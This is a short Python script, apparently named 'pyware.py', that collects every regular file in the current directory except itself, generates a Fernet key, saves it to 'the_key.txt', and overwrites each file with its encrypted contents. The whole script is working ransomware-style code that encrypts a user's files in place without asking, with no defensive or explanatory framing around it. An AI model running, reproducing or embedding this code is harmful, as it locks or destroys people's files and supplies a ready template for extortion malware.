#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

desk_files = []
for desk_file in os.listdir():
    if desk_file == "pyware.py":
        continue
    if os.path.isdir(desk_file):
        continue
    desk_files.append(desk_file)

key = Fernet.generate_key()
with open("the_key.txt", "wb") as the_key:
    the_key.write(key)

for file in desk_files:
    with open(file, "rb") as files:
        file_content = files.read()
    encrypted_content = Fernet(key).encrypt(file_content)
    with open(file, "wb") as files:
        files.write(encrypted_content)
